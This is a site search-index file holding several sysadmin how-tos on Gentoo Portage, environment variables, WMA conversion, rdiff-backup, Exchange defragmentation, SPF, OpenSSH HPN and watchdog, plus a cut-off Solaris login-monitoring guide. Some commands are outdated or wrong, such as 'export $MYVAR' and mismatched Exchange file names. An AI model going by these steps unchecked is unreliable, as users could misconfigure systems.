                content: "Introduction linkThe Gentoo Portage system is an excellent resource (in terms of software) when used correctly. However, incorrect use can lead to a bloated system with unidentifiable packages and files that cannot be updated. This guide will help users properly manage Gentoo portages to have a better system.\nInstalling packages linkFirst, what do we mean by “Emerge”? The description of the emerge command (available in English here), indicates that emerge is the command-line program that serves as the interface to the Portage system. This command allows packages to be installed on the system. This installation includes (these steps are fully automated):\nfinding dependencies for the package in question installing and/or updating dependencies if necessary installing the package in question After “emerging” a package, the package is integrated into the system, which can use it directly.\nThe Portage tree linkPortage has a large database of packages it can install. This database is called the Portage tree. This tree is stored on the hard drive, usually in the /usr/portage/ directory. To benefit from the latest packages, it is necessary to keep the tree up-to-date by synchronizing it with the official Gentoo tree, which is updated hundreds of times per day and stored on dedicated servers. This operation is done very simply on a Gentoo system connected to the Internet by typing:\n# emerge --sync It is unnecessary and not recommended to update the Portage tree more than once a day.\nChoosing the right mirrors linkTo update its tree or obtain the sources of packages to install, Portage must download files from one of its servers. There are many mirrors containing these files, so it’s better to choose one that is fastest for your geographic area. This choice can be made automatically using the mirrorselect program.\nTo install mirrorselect:\nemerge mirrorselect Once the installation is complete, to choose the 4 best mirrors for downloading sources:\nmirrorselect -D -s4 -t5 You can optionally specify the -D option for a more accurate evaluation of mirror performance, but the operation will take longer. The /etc/make.conf file is automatically updated to take into account the chosen mirrors.\nBy running mirrorselect -ir, you can also choose the geographic area of servers to contact to synchronize the Portage tree. However, French mirrors are often not very performant, so it’s best to leave the default option (SYNC=“rsync://rsync.gentoo.org/gentoo-portage” in the /etc/make.conf file).\nACCEPT_KEYWORDS linkThe “emerge” function makes it very easy to manage the installation of stable and unstable packages (newer versions of the same software but insufficiently tested). A simple (even simplistic) method to install an unstable package (let’s take vlc as an example) for an x86 architecture would be:\nACCEPT_KEYWORDS=\"~x86\" emerge vlc Unfortunately, this simple method only allows installing the unstable package (vlc) temporarily. During the next system update, the emerge -u world command will try to replace the unstable version of the package with its stable version. A cleaner method is to indicate in the /etc/portage/package.keywords file that we want to use the unstable version:\necho media-video/vlc \u003e\u003e /etc/portage/package.keywords Thus, each time we want to emerge vlc (during an update for example), the ACCEPT_KEYWORDS=\"~x86\" command will be implied.\nMasked packages linkVarious situations may lead us to mask (or unmask) certain packages. Similarly to above, you need to use the /etc/portage/package.mask file to do this.\necho x11-base/xfree \u003e\u003e /etc/portage/package.mask And to unmask a masked package, you obviously do:\necho media-video/realone \u003e\u003e /etc/portage/package.unmask USE variable linkThe best way to affect compilation options for packages that interest us is to assign each package (as they are installed) a line in the /etc/portage/package.use file as follows:\necho net-p2p/bittorrent -X \u003e\u003e /etc/portage/package.use Package maintenance linkWhen you want to update your system with the ’emerge -u world’ command, it is possible that Portage might suggest replacing an application with an older version.\nAbout the ‘world’ file linkFirst, a brief explanation of what the ‘world’ file is. The ‘world’ file lists all packages that the user wants to be able to automatically update with Portage (using the emerge -u world command). For example, by running:\nemerge gnome Portage records the corresponding package (here gnome-base/gnome) in the ‘world’ file - only gnome, not its dependencies. This is why, when you run emerge -u world, only packages in the world file are updated, not the dependencies. To update dependencies as well, use the –deep option, or -D for short.\nIf you lose your ‘world’ file, Portage will no longer know which packages you want to update, which is generally considered problematic.\nTo try to recover your ‘world’ file, run:\nregenworld The world file resides in /var/lib/portage/world. You can check its content but don’t edit it manually, otherwise Portage could behave erratically.\nAlso take a look at this thread which gives instructions for recovering your ‘world’ file if regenworld doesn’t work.\nUpdating installed software linkUsing this method, you’ll ensure that the ’emerge -u world’ command does its job correctly, and you’ll have a perfectly configured machine.\nemerge -uDavt world This is the best way to update your Gentoo system. -u for upgrade (update to the latest packages) -D for deep (update dependencies) -a for ask (displays the list of packages to update and asks before compiling) -v for verbose (displays maximum information, e.g., USE flags used for each package) -t for tree (displays packages as a dependency tree).\nI recommend trying ecatmur’s Cruft script or hepta_sean’s more recent ‘findcruft’ script to keep your system clean and tidy!\n"
            }
        );
    index.add(
            {
                id:  802 ,
                href: "\/Env_:_variables_d\u0027environnements\/",
                title: "Environment Variables",
                description: "A guide on how to manage environment variables in Linux systems.",
                content: "For environment variables, when you don’t use them often, it’s not always easy to remember the commands.\nTo display your PATH:\necho $PATH To display all environment variables:\nenv To add something to your PATH:\nPATH=$PATH:/path/to/add To add a new environment variable:\nMYVAR=/toto export $MYVAR Check with the env command and it works! :-)\n"
            }
        );
    index.add(
            {
                id:  803 ,
                href: "\/apt-file-recherche-de-fichiers-qui-empechent-une-compilation\/",
                title: "Apt-file: Searching for Files That Prevent Compilation",
                description: "Learn how to use the apt-file utility to find missing files needed for compilation in Debian-based systems",
                content: "Apt-file is a utility that quickly becomes indispensable from the first time it’s used. Here’s a small documentation:\nApt-file Documentation\n"
            }
        );
    index.add(
            {
                id:  804 ,
                href: "\/Convertir_du_WMA_en_MP3\/",
                title: "Converting WMA to MP3",
                description: "A guide on how to convert WMA audio files to MP3 format using Linux tools like lame, mplayer and perl.",
                content: "Introduction linkTo convert WMA format (thanks Microsoft) to MP3 format, you will need “lame”, “mplayer”, and “perl”. You must have the unofficial package repositories configured in Debian to install lame.\nInstallation linkTo install everything once you have the unofficial package repositories configured:\napt-get install lame mplayer perl Then create a file named convert.pl and insert these lines:\n#! /usr/bin/perl ### WMA TO MP3 CONVERTER ### $dir=`pwd`; chop($dir); opendir(checkdir,\"$dir\"); while ($file=readdir(checkdir)) { $orig_file=$file; if ($orig_file !~ /\\.wma$/i) {next}; print \"Conversion in progress: $orig_file\\n\"; $new_wav_file=$orig_file;$new_wav_file=~s/\\.wma/\\.wav/; $new_mp3_file=$orig_file;$new_mp3_file=~s/\\.wma/\\.mp3/; $convert_to_wav=\"mplayer \\\"./$orig_file\\\" -ao pcm -aofile \\\"./$new_wav_file\\\"\"; $convert_to_mp3=\"lame -h \\\"./$new_wav_file\\\" \\\"./$new_mp3_file\\\"\"; $remove_wav=\"rm -rf \\\"./$new_wav_file\\\"\"; print \"EXEC 1: $convert_to_wav\\n\"; $cmd=`$convert_to_wav`; print \"EXEC 2: $convert_to_mp3\\n\"; $cmd=`$convert_to_mp3`; print \"REMOVE WAV: $remove_wav\\n\"; $cmd=`$remove_wav`; print \"\\n\\n\"; } print \"Done....\"; Then set the appropriate permissions:\nchmod 755 convert.pl Execute it in the folder containing your WMA files:\n./convert.pl "
            }
        );
    index.add(
            {
                id:  805 ,
                href: "\/Rdiff-backup_:_Sauvegardes_distantes_incr%C3%A9mentielles\/",
                title: "Rdiff-backup: Incremental Remote Backups",
                description: "Guide for setting up and using rdiff-backup for incremental remote backups over SSH.",
                content: "rdiff-backup is a simple and efficient utility. It can be used to make a remote backup of a directory via SSH. The differences are then saved in archives. rdiff-backup Main page\nTo install it:\nemerge rdiff-backup To make a backup on a remote computer, rdiff-backup must be installed on both machines.\nFor example, if the remote machine is called remotehost.remotedomain, to make a backup you simply do:\nrdiff-backup ~/mydir remoteuser@remotehost.remotedomain::mydir-backup This creates a new directory named mydir-backup in the HOME directory of the user remoteuser on remotehost.remotedomain. If the directory already exists, it is updated according to the content of mydir, and the differences are also stored.\nFor more complete examples: Examples on the rdiff-backup site.\nTo make authentication automatic, it is recommended to use key-based authentication with SSH.\n"
            }
        );
    index.add(
            {
                id:  806 ,
                href: "\/Exchange_:_R%C3%A9parer_et_d%C3%A9fragmenter_les_bases_de_donn%C3%A9es\/",
                title: "Exchange: Repairing and Defragmenting Databases",
                description: "Guide on how to repair and defragment Exchange databases to improve performance and reduce storage space.",
                content: "Introduction linkDuring the defragmentation process, database objects that are no longer useful are removed from the database to increase its free space. By defragmenting an Exchange database, you’ll increase data access speed, compact the database, and thus reduce the used space.\nPractice linkTo perform an Offline defragmentation, go to your Exchange server folder C:\\Program Files\\EXCHSRVR\\BIN. There you will find the EDBUTIL utility that allows you to dismount the database. Then use the “ESEUTIL” command with the /D option. For example, to defragment the PRIV.EDB file, use the following command:\nESEUTIL /D PRIV.EDB. The /P switch (which is generally used to repair a database) can be used in combination with the /D switch to increase performance and reliability. Every time you repair a database, the original database file does not change. Unlike ESEUTIL which creates another file and sends the repaired database to this file. In the case of a fully functional database, using the /P switch with the /D switch results in the creation of the defragmented database in a separate file.\nThere are two advantages to proceeding this way:\nFirst, you know you’re not overwriting good database files. So if something goes wrong in the defragmentation process, you don’t have to worry about whether the database has been destroyed. The second advantage of using this method is that it increases the speed of the defragmentation process since Exchange doesn’t have to browse the data in a single file. The /T option is not required but allows you to control the name and location of the new version of the database. Once defragmentation is complete, you can simply move this new database to the location where the old database is, delete or rename the old database, then rename the new database by giving it the same name as the old database. The syntax is:\nESEUTIL /D /P \"path and file\" /T \"path and file\" For example, if you are defragmenting the PRIV.EBD file and want to create a new file called PRIV2.EDB, you would use the following command:\nESEUTIL /D /P\"C:\\PROGRAM FILES\\EXCHSRVR\\MDBDATA\\PRIV.EDB\" /T\"C:\\PROGRAM FILES\\EXCHSRVR\\MDBDATA\\PRIV2.MDB\" "
            }
        );
    index.add(
            {
                id:  807 ,
                href: "\/Gentoo_:_Bien_commencer_avec_Gentoo\/",
                title: "Gentoo: Getting Started",
                description: "Learn essential commands and tips for getting started with Gentoo Linux after a fresh installation.",
                content: "Introduction linkGentoo is a Linux distribution known as a source-based distribution. It was designed to be modular, portable, and optimized for the user’s hardware. As such, all programs must be compiled from source code. However, many software packages available in precompiled form for different architectures can also be used. This is managed through Gentoo’s Portage system.\nIts particularity is the complete (or partial) compilation of a GNU/Linux system from sources, similar to Linux From Scratch but automated.\nIts package management tools are inspired by BSD ports. This process allows for complete optimization and customization of the system but takes some time to compile all the necessary software.\nThis type of installation allows you to make the best use of your machine’s architecture. Indeed, the source code will be compiled taking into account the possible optimizations of the processor’s instruction set. Most distributions are compiled with the i386 instruction set and not for a more recent processor, in order to maintain functionality on as many machines as possible. More recent processors then operate minimally without using the manufacturer’s optimizations.\nIn addition, this type of installation makes it easy to manage dependencies, even during a major update of the entire distribution. When installing each program, the development libraries that accompany it are automatically installed, and other programs that use these libraries will be automatically recompiled with the new version of these libraries during the update. The result is a high-performance, coherent, and stable system.\nSince Gentoo is a bit special in some ways, I’ll note here the essential points that helped me make a clean installation.\nAfter an Installation linkAuthorizing a User to Connect as Root linkFor security reasons, users can switch to root with su only if they belong to the wheel group. To add a username to the wheel group, type the following command as root:\ngpasswd -a username wheel Updating the Package List linkUse this command:\nemerge --sync Installing Software linkTo install software:\nemerge screen Here I’m installing screen.\nUpdating Gentoo linkSoftware Updates linkHere’s a command to see what’s left to update:\nemerge -Dvp world Now let’s update Gentoo:\nemerge world This command allows you to recompile the entire system:\nemerge -e world Configuration Updates linkIf you have a message like:\n* IMPORTANT: 33 config files in /etc need updating. You can find out which configuration files want to be replaced:\nfind /etc -iname '._cfg????_*' For more information, consult the command:\nemerge --help config Searching for a Package linkTo search for a package or description:\nemerge --searchdesc searchword Note: Currently on Gentoo, it is preferable to install “esearch” or “eix” to make searches. Then, it’s used like this:\neix searchword esearch searchword Installing a Specific Package linkFor example, I’d like to install munin. However, I’m having issues because I’m on the stable version (“x86”) and I want to install the version that’s in unstable (\"**~**x86\") because it doesn’t exist in stable. When I do:\nemerge munin I get this:\nCalculating dependencies !!! All ebuilds that could satisfy \"munin\" have been masked. !!! One "
            }
        );
    index.add(
            {
                id:  808 ,
                href: "\/Ext3_:_redimensionner_ses_partitions_sans_pertes_de_donn%C3%A9es\/",
                title: "Ext3: Resize partitions without data loss",
                description: "How to resize Ext3 partitions without data loss, including instructions and procedures to safely modify your filesystem size.",
                content: "Here is an interesting and quick documentation:\nResize ext3 without data loss\n"
            }
        );
    index.add(
            {
                id:  809 ,
                href: "\/Nagios_:_2_Load_Balancing\/",
                title: "Nagios: 2 Load Balancing",
                description: "Documentation on how to implement load balancing with Nagios",
                content: "Here is documentation on how to implement load balancing with Nagios:\nNagios2 load balancing PDF\n"
            }
        );
    index.add(
            {
                id:  810 ,
                href: "\/SPF_%28Sender_Policy_Framework%29_:_Pr%C3%A9vention_de_la_contrefa%C3%A7on_d%27adresses_mails\/",
                title: "SPF (Sender Policy Framework): Prevention of Email Address Forgery",
                description: "An overview of SPF (Sender Policy Framework), how it works, what it needs to function, and how to configure it to prevent email address forgery.",
                content: "Introduction linkSPF stands for Sender Policy Framework. SPF aims to be an anti-counterfeiting standard to prevent email address forgery.\nSPF was born in 2003. Its creator, Meng Weng Wong, took the best features of Reverse MX and DMP (Designated Mailer Protocol) to create SPF.\nSPF uses the return path (MAIL FROM) present in the message header, since all MTAs work with these fields. However, there is a new concept proposed by Microsoft: PRA, which stands for Purported Responsible Address. The PRA corresponds to the end-user address that an MUA (like Thunderbird) uses.\nThus, when we combine SPF and PRA, we can get the so-called Sender ID that allows a user receiving an email to perform verifications of MAIL FROM fields (SPF verification) and PRA. In a way, it is said that MTAs will check the MAIL FROM field and MUAs will check the PRA field.\nFor now, SPF needs DNS to work properly. This means that “reverse MX” records need to be published. These records specify which machines send email for a given domain. This is different from MX records, used today, which specify the machines that receive email for a given domain.\nWhat Does SPF Need to Function? linkTo protect your system with SPF, you must:\nConfigure your DNS to add the TXT record where the information that SPF requires is introduced. Configure your email system (qmail, sendmail) to use SPF; this means performing verification on each message received on your server. The first step will be accomplished on the DNS server where the domain is located. In the next section, we will discuss the details of the records. One thing you need to keep in mind is the syntax your DNS server uses (bind or djbdns). But don’t be afraid: the official SPF site provides excellent help that will guide you.\nThe SPF TXT Record linkThe SPF record is contained in a TXT record and its format is as follows:\nv=spf1 [[pre] type [ext] ] ... [mod] The meaning of each parameter is as follows:\nParameters Descriptions v=spf1 SPF version. When using SenderID, you might see v=spf2 pre Defines a return code when a match occurs.\nPossible values are:\n| Values | Descriptions |\n|——-|—————-|\n| + | Default. Means “pass” when a test is conclusive. |\n| - | Means “fail a test”. This value is normally applied to -all to say that there were no previous matches. |\n| ~ | Means “soft fail”. This value is normally applied when a test is not conclusive. |\n| ? | Means “neutral”. This value is normally applied when a test is not conclusive. | | | type | Defines the type to use for verifications\nPossible values are:\n| Values | Descriptions |\n|——-|—————-|\n| include | to include tests of a provided domain. It is written as: include:domain |\n| all | to end the sequence of tests. For example, if it’s -all, then all tests that haven’t been met so far fail. But if there is uncertainty, it can be used in the form of ?all which means that the test will be accepted. |\n| ip4 | Uses an IP version 4 for verification. This can be used in the form ipv4:ipv4 or ipv4:ipv4/cidr to define a range. This type is most recommended because it gives the smallest load on DNS servers. |\n| ip6 | Uses an IP version 6 for verification. |\n| a | Uses a domain name for verification. This will perform a lookup on the DNS for an A RR. It can be used in the form a:domain, a:domain/cidr, or a/cidr. |\n| mx | Uses the MX RR of the DNS for verification. The MX RR defines the receiving MTA; for example, if it’s not the same as the sending MTA, the tests based on MX will fail. It can be used in the form mx:domain, mx:domain/cidr, or mx/cidr. |\n| ptr | Uses the PTR RR of the DNS for verification. In this case, a PTR RR is used, as well as a reverse map query. If the hostname returned is in the same domain, the communication is verified. It can be used in the form ptr:domain\nexist | Tests the existence of a domain. It can be written in the form exist:domain. | | | ext | Defines an optional extension to the type. If omitted, then a single record is used for the query. | | mod | This is the last directive of type and it acts as a record modifier.\n| Modifiers | Descriptions |\n|———–|—————-|\n| redirect | Redirects the verification to use SPF records of a defined domain. It is used in the form redirect=domain. |\n| exp | This record must be the last one and it allows customizing the failure message.\nIN TXT \"v=spf1 mx -all exp=getlost.example.com\"\ngetlost IN TXT \"You are not allowed to send a message for the domain\"\n| |\nIn Case I Am an ISP linkISPs will have some “problems” with their roaming users if they use mechanisms like POP-before-Relay instead of SASL SMTP.\nWell, if you are an ISP concerned about spam and forgery, you must consider your email policy and start using SPF.\nHere are some steps you should consider:\nFirst, configure your MTA to use SASL; for example, you can enable it on ports 25 and 587. Warn your users about the policy you are implementing (spf.pobox.com provides an example, see the references). Give your users a grace period; this means you will publish your SPF records in DNS but with a soft fail (~all) instead of a fail (-all) for the tests. And with that, you protect your servers, your clients, and the world against spam…\nThere is a lot of information for you on the official SPF site… What are you waiting for?\nWhat Things Should You Pay Attention To? linkSPF is a perfect solution to protect yourself against fraud. However, it has a limitation: traditional email forwarding will no longer work. You cannot simply receive an email in your MTA and forward it. You must rewrite the sender’s address. Patches for common MTAs are provided on the SPF site. In other words, if you start publishing SPF records in DNS, you should also update your MTA to rewrite sender addresses, even if you don’t yet verify SPF records.\nConclusion linkYou might think that implementing SPF could be somewhat confusing. Well, indeed, it’s not complicated and, by the way, you have great help that helps you accomplish your mission (see the references section).\nIf you are concerned about spam, then SPF will help you by protecting your domain from forgeries, and all you have to do is add a line of text in your DNS server and configure your email server.\nThe advantages that SPF brings are enormous. However, as I told someone, it’s not as big a difference as between day and night. The benefits of SPF will come with time, as others adopt it.\nI referenced Sender ID and its relationship to SPF, but I didn’t elaborate on explanations about it. You probably already know the reason: Microsoft’s policy is still the same, namely software patenting. In the references, you can see openspf.org’s position on SenderID.\nIn a future article, we will talk about MTA configuration. See you later!\nI hope I have given you a brief introduction to SPF. If you want to learn more about it, simply use the references that were used to write this article.\nReferences linkThe official SPF site\nThe official SPF FAQ\nThe official SPF help\nThe position of openspf.org about SenderID\nAn excellent article about SenderID and SPF\nWarn your users about the SASL conversion\nHOWTO - Define an SPF record\n"
            }
        );
    index.add(
            {
                id:  811 ,
                href: "\/OpenSSH_HPN_%28High_Performance_Enabled%29_:_Impl%C3%A9mentation_et_installation\/",
                title: "OpenSSH HPN (High Performance): Implementation and Installation",
                description: "A guide on how to implement and install OpenSSH HPN (High Performance Enabled) which removes performance bottlenecks in standard OpenSSH.",
                content: "Introduction linkHere’s the introduction provided by the website:\nSCP and the underlying SSH2 protocol implementation in OpenSSH is network performance limited by statically defined internal flow control buffers. These buffers often end up acting as a bottleneck for network throughput of SCP, especially on long and high bandwidth network links. Modifying the SSH code to allow the buffers to be defined at runtime eliminates this bottleneck. We have created a patch that will remove the bottlenecks in OpenSSH and is fully interoperable with other servers and clients. In addition, HPN clients will be able to download faster from non-HPN servers, and HPN servers will be able to receive uploads faster from non-HPN clients. However, the host receiving the data must have a properly tuned TCP/IP stack. Please refer to this tuning page for more information.\nThe amount of improvement any specific user will see is dependent on a number of issues. Transfer rates cannot exceed the capacity of the network nor the throughput of the I/O subsystem including the disk and memory speed. The improvement will also be highly influenced by the capacity of the processor to perform the encryption and decryption. Less computationally expensive ciphers will often provide better throughput than more complex ciphers.\nApplying the Patch linkFirst, you need to have the source code of OpenSSH which you can download from: http://www.openssh.com/portable.html\nFor this tutorial, we’ll use the up-to-date version, which is 4.5p1. Download the source:\nwget ftp://ftp.fr.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-4.5p1.tar.gz Next, download the OpenSSH HPN patch for our version (4.5p1):\nwget http://www.psc.edu/networking/projects/hpn-ssh/openssh-4.5p1-hpn12v14.diff.gz Now decompress the archives:\ntar -xzvf openssh-4.5p1.tar.gz gzip -d openssh-4.5p1-hpn12v14.diff.gz Now let’s patch the source code:\ncd openssh-4.5p1 patch -p1 \u003c ../openssh-4.5p1-hpn12v14.diff If everything went well, the last lines should look like:\n... patching file session.c patching file ssh.c patching file sshconnect.c patching file sshconnect2.c patching file sshd.c patching file sshd_config patching file version.h Compilation linkBefore starting the configuration, you need to install the dependencies (openssl-dev):\napt-get install libcurl3-openssl-dev make gcc Next, we can start the configuration:\n./configure --bindir=/usr/bin --sbindir=/usr/sbin --sysconfdir=/etc/ssh --with-md5-passwords Add any arguments you may need if necessary.\nCompile:\nmake Install:\nmake install Your installation is now complete, and you have access to OpenSSH’s HPN features! :-)\nFAQ linkWhat About on Dedibox? linkMany people have struggled with recompiling SSH. Here’s the solution! Install this:\napt-get install libpam0g-dev Then, during configuration, add this option:\n./configure --bindir=/usr/bin --sbindir=/usr/sbin --sysconfdir=/etc/ssh --with-md5-passwords --with-pam "
            }
        );
    index.add(
            {
                id:  812 ,
                href: "\/Watchdog_:_d%C3%A9tection_de_probl%C3%A8mes_hardware\/",
                title: "Watchdog: Hardware Problem Detection",
                description: "This article explains how to use the Linux watchdog system to monitor hardware issues and automatically reboot the system when problems are detected.",
                content: "Introduction linkIn computer hardware, a watchdog is an electronic or software mechanism designed to ensure that an automated system hasn’t become stuck at a particular processing step. It’s a protection mechanism designed to restart the system if a defined action is not executed within a given time period.\nWhen implemented in software, it typically consists of a counter that is regularly reset to zero. If the counter exceeds a given value (timeout), then a system reset is triggered. The watchdog often consists of a register that is updated via a regular interrupt. It can also consist of an interrupt routine that must perform certain maintenance tasks before returning control to the main program. If a routine enters an infinite loop, the watchdog counter will no longer be reset to zero, and a reset is ordered. The watchdog also allows a restart if no instruction is provided for this purpose. You simply need to write a value exceeding the counter’s capacity directly into the register. The watchdog will then initiate the reset.\nIn industrial computing, the watchdog is often implemented as an electronic device, generally a monostable flip-flop. It is based on the principle that each processing step must execute within a maximum time. It is therefore possible to arm a timer before its execution. When the flip-flop returns to its stable state before the task is complete, the watchdog is triggered. It implements a backup system that can either trigger an alarm, restart the device, or activate a redundant system.\nWatchdogs are often integrated into microcontrollers and motherboards dedicated to real-time operations.\nInstallation linkWatchdog is simple to install and set up:\napt-get install watchdog There’s also a small kernel component to implement:\nCONFIG_WATCHDOG=y CONFIG_SOFT_WATCHDOG=y Configuration linkConfiguration is done in the /etc/watchdog.conf file. Let’s look at some different mechanisms.\nNetworks linkTake here for example the IP addresses 192.168.0.138 and 192.168.0.1. This means that we’re going to continuously ping these IP addresses, and if one of them doesn’t respond, it means we have a failure on our machine and therefore need to reboot. This method is quite dangerous in production, so be sure of what you’re doing.\nping = 192.168.0.138 ping = 192.168.0.1 interface = eth0 file = /var/log/messages The pings are sent from the network card eth0 and are logged in /var/log/messages.\nSystem Load linkIf you believe your machine contains no bugs and that if the memory load is too high, there’s a problem and you need to reboot, then here’s an option that will appeal to you:\nmax-load-1 = 24 max-load-5 = 18 max-load-15 = 12 Modify the values according to your needs.\nTemperature linkIf you monitor your machine and want to restart in case of overheating, use this:\ntemperature-device = /dev/hda max-temperature = 50 You should normally have already configured sensors beforehand (e.g., hdparm \u0026 lm-sensors).\nDefault Options linkYou must also set the default options and adapt them to your needs:\n# Defaults compiled into the binary admin = root interval = 10 logtick = 1 # This greatly decreases the chance that watchdog won't be scheduled before # your machine is really loaded realtime = yes priority = 1 # Check if syslogd is still running by enabling the following line pidfile = /var/run/syslogd.pid Once finished, apply the changes by restarting the service:\n/etc/init.d/watchdog restart "
            }
        );
    index.add(
            {
                id:  813 ,
                href: "\/Monitorer_ses_Solaris_Users\/",
                title: "Monitor Your Solaris Users",
                description: "How to monitor Solaris user activities, track logins, and manage access control on Solaris systems.",
                content: "Introduction linkAll systems should be monitored routinely for unauthorized user access. You can determine who is or who has been logged into the system by executing commands and examining log files.\nwho linkIf a user is logged in remotely, the who command displays the remote host name, or Internet Protocol (IP) address in the last column of the output.\nwho root console Oct 17 08:21\t(:0) root pts/4 Oct 17 08:21\t(:0.0) root pts/5 Oct 17 08:21\t(:0.0) user5 pts/6 Oct 17 09:20\t(sys-03) root pts/7 Oct 17 09:20\t(:0.0) user3 pts/8 Oct 17 09:21\t(localhost) rusers linkThe rusers command produces output similar to that of the who command, but it displays a list of the users logged in on local and remote hosts. The list displays the user’s name and the host’s name in the order in which the responses are received from the hosts.\nA remote host responds only to the rusers command if its rpc.rusersd daemon is enabled. The rpc.rusersd daemon is the network server daemon that returns the list of users on the remote hosts.\nNote: The rusers facility is managed using the Service Management Facility (SMF).\nTo see whether the rusers facility is online, issue the command:\n# svcs -a | grep rusers online 17:00:48 svc:/network/rpc/rusers:default The following is the command format for the rusers command:\nrusers -options hostname The rusers -l command displays a long list of the login names of users who are logged in on local and remote systems. The output displays the name of the system into which a user is logged, the login device (TTY port), the login date and time, the idle time, and the login host name. If the user is not idle, no time is displayed in the idle time field. The term idle means that the user is not actively doing anything at the time on the terminal, which would denote the user is probably at screen lock or away from the terminal.\nThe following is an example of the rusers command:\n# rusers -l Sending broadcast for rusersd protocol version 3... root sys-02:console Oct 17 08:21 (:0) user5 sys-02:pts/6 Oct 17 09:20 1 (sys-03) user3 sys-02:pts/8 Oct 17 09:21 1 (localhost) root fe80::203:baff:f:pts/2 Oct 17 09:18 1 (sys-02) root sys-03:pts/2 Oct 17 09:18 1 (sys-02) Sending broadcast for rusersd protocol version 2... finger linkTo display detailed information about user activity that is either local or remote, use the finger command.\nThe finger command displays:\nThe user’s login name The home directory path The login time The login device name The data contained in the comment field of the /etc/passwd file (usually the user’s full name) The login shell The name of the host, if the user is logged in remotely, and any idle time The following is the command format for the finger command:\nfinger [-bfhilmpqsw] [username...] finger [-l] [ username@hostname1 [ @hostname ]] The -m option matches arguments only on username (not the first or last name that might appear in the comment field of /etc/passwd).\nTo display information for usera, perform the command:\n# finger -m user5 Login name: user5 Directory: /export/home/user5 Shell: /bin/ksh On since Oct 17 09:20:43 on pts/6 from sys-03 1 minute 50 seconds Idle Time No unread mail No Plan. If users create the standard ASCII files .plan or .project in their home directories, the content of those files is shown as part of the output of the finger command.\nThese files are traditionally used to outline a user’s current plans or projects and must be created with file access permissions set to 644 (rw-r–r–).\nNote: You get a response from the finger command only if the network/finger service is enabled.\n# inetadm | grep finger enabled online svc:/network/finger:default last linkUse the last command to display a record of all logins and logouts with the most recent activity at the top of the output. The last command reads the binary file /var/adm/wtmpx, which records all logins, logouts, and reboots.\nEach entry includes the user name, the login device, the host that the user is logged in from, the date and time that the user logged in, the time of logout, and the total login time in hours and minutes, including entries for system reboot times.\nThe output of the last command can be extremely long. Therefore, you might want to use it with the -n number option to specify the number of lines to display.\nThe following is an example of the last command:\n# last user3 pts/8 localhost Sun Oct 17 09:21 still logged in root console :0 Sun Oct 17 08:21 still logged in reboot system boot Sun Oct 17 08:00 wtmp begins Fri Oct 15 11:36 (output truncated) You can use the last command also to display information about an individual user if you supply the user’s login name as an argument.\n# last user5 user5 pts/6 sys-03 Sun Oct 17 09:20 still logged in user5 pts/7 localhost Sun Oct 17 09:13 - 09:15 (00:02) (output truncated) To view the last five system reboot times only, perform the command:\n# last -5 reboot reboot system boot Sun Oct 17 08:00 reboot system down Sun Oct 17 03:27 reboot system boot Sun Oct 17 03:16 reboot system down Sun Oct 17 03:27 reboot system boot Sun Oct 17 03:16 logins linkWhen a user logs in to a system either locally or remotely, the login program consults the /etc/passwd and the /etc/shadow files to authenticate the user. It verifies the user name and password entered.\nIf the user provides a login name that is in the /etc/passwd file and the correct password for that login name, the login program grants access to the system.\nIf the login name is not in the /etc/passwd file or the password is not correct for the login name, the login program denies access to the system.\nYou can log failed login attempts in the /var/adm/loginlog file. This is a useful tool if you want to determine if attempts are being made to break into a system.\nBy default, the loginlog file does not exist. To enable logging, you should create this file with read and write permissions for the root user only, and it should belong to the sys group.\n# touch /var/adm/loginlog # chown root:sys /var/adm/loginlog # chmod 600 /var/adm/loginlog All failed command-line login activity is written to this file automatically after five consecutive failed attempts.\nThe loginlog file contains one entry for each of the failed attempts. Each entry contains the user’s login name, login device (TTY port), and time of the failed attempt.\nIf there are fewer than five consecutive failed attempts, no activity is logged to this file. This value is configured by setting the appropriate syslog_failed_login parameter in the /etc/default/login file:\n# tail -15 /etc/default/login # RETRIES determines the number of failed logins that will be # allowed before login exits. Default is 5 and maximum is 15. # If account locking is configured (user_attr(4)/policy.conf(4)) # for a local user's account (passwd(4)/shadow(4)), that account # will be locked if failed logins equals or exceeds RETRIES. # #RETRIES=5 # # The SYSLOG_FAILED_LOGINS variable is used to determine how many failed # login attempts will be allowed by the system before a failed login # message is logged, using the syslog(3) LOG_NOTICE facility. For example, # if the variable is set to 0, login will log -all- failed login attempts. # #SYSLOG_FAILED_LOGINS=5 su linkFor security reasons, you must monitor who has been using the su command, especially those users who are trying to gain root access on the system. You can initiate the monitoring by setting two variables in the /etc/default/su file.\nNote: There are many variables in the /etc/default/su file. This course presents only a small subset of the variables.\nContents of the /etc/default/su File\nTo display the contents of the /etc/default/su file, perform the command:\n# cat /etc/default/su #ident\t\"@(#)su.dfl\t1.6\t93/08/14 SMI\"\t/* SVr4.0 1.2\t*/ # SULOG determines the location of the file used to log all su attempts # SULOG=/var/adm/sulog # CONSOLE determines whether attempts to su to root should be logged # to the named device # #CONSOLE=/dev/console (output edited for brevity) SYSLOG=YES In the preceding example, unsuccessful attempts to use the su command to access the root account are logged to the /var/adm/messages file. The following is an example entry from that file:\nOct 16 12:35:47 sys-02 su: [ID 810491 auth.crit] 'su root' failed for user3 on /dev/pts/2 The CONSOLE Variable in the /etc/default/su File\nBy default, the system ignores the CONSOLE variable in the /etc/default/su file because of the preceding comment (#) symbol. All attempts to use the su command are logged to the console, regardless of success or failure. Here is an example of output to the console:\nFeb 2 09:50:09 host1 su: 'su root' failed for user1 on /dev/pts/4 Feb 2 09:50:33 host1 su: 'su user3' succeeded for user1 on /dev/pts/4 When the comment symbol is removed, the value of the CONSOLE variable is defined for the /dev/console file. Subsequently, an additional line of output for each successful attempt to use the su command to access the root account is logged to the console. Here is an example of logged su command activity:\nFeb 2 11:20:07 host1 su: 'su root' succeeded for user1 on /dev/pts/4 SU 02/02 11:20 + pts/4 user1-root The SULOG Variable in the /etc/default/su File\nThe SULOG variable in the /etc/default/su file specifies the name of the file in which all attempts to use the su command to switch to another user are logged. If the variable is undefined, the su command logging is turned off.\nThe /var/adm/sulog file is a record of all attempts by users on the system to execute the su command. Each time the su command is executed, an entry is added to the sulog file.\nThe entries in this file include the date and time the command was issued, whether it was successful (shown by the plus (+) symbol for success or the hyphen (-) symbol for failure), the device from which the command was issued, and, finally, the login and the effective identity.\nThe following is an example of entries from the /var/adm/sulog file:\n# more /var/adm/sulog SU 10/17 02:51 + ??? root-uucp SU 10/17 09:26 + pts/10 user3-root SU 10/17 09:27 + pts/10 user3-user5 SU 10/17 09:28 + pts/10 user3-user5 SU 10/17 09:28 + pts/10 